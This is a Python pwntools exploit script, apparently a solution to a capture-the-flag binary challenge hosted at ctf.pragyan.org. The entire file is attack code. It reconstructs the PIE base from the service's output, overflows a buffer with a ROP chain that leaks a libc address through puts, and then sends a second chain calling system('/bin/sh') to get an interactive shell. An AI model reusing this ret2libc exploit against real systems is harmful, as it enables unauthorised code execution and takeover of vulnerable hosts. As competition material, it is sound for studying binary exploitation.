from pwn import *
import re
import random

context.log_level = 'WARNING'

while True:
    #p = process("./gpsu")
    p = remote("ctf.pragyan.org","17000")
    p.recvline()
    line1 = re.findall(r'\|(.*?)\|   \|(.*?)\|   \|(.*?)\|   \|(.*?)\|',p.recvline())

    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()
    line2 = re.findall(r'\|(.*?)\|   \|(.*?)\|   \|(.*?)\|   \|(.*?)\|',p.recvline())
    pie = '0'+line1[0][0]+line2[0][0]+line1[0][1]+line2[0][1]+line1[0][2]+line2[0][2]+line1[0][3]+line2[0][3]+random.choice('abcdef09876543210')+'000'

    print 'pie '+hex(int(pie,16))

    pie = int(pie,16)

    buff  = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
    #buff += p64(pie+0x1269) #found
    pop_rdi = p64(pie + 0x00000000000014d3)
    puts_plt = p64(pie + 0x10e0)
    exit_got = p64(pie + 0x0000000000003fd0)
    main = p64(pie+0x143C)
    pop_rsi = p64(pie + 0x00000000000014d1)
    buff += pop_rdi
    buff += exit_got
    buff += puts_plt
    buff += main
     #main

    p.sendline(buff)
    
    try:
        #print p.recv(4000)
        data = p.recv(4000)
        #print data
        data = p.recvline()
        print data
        #data = data.strip()
        data = data[:-1]
        for i in data:
        	print i.encode('hex')
        leak = u64(data.ljust(8,"\x00"))
        print hex(leak)
        base = leak - 0x043120
        system = base + 0x04f440
        binsh = base + 0x1b3e9a
        print "base: ",hex(base)
        print "binsh:" ,hex(binsh)
        print "system: ",hex(system)
        payload = ""
        payload += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
        payload += pop_rsi
        payload += p64(0xdeadbeef)
        payload += p64(0xdeadbeef)
        payload += pop_rdi
        payload += p64(binsh)
        payload += p64(system)
        p.sendline(payload)
        pause()
        p.interactive()
    except Exception as e:
        print 'no'
    #p.interactive()
    p.close()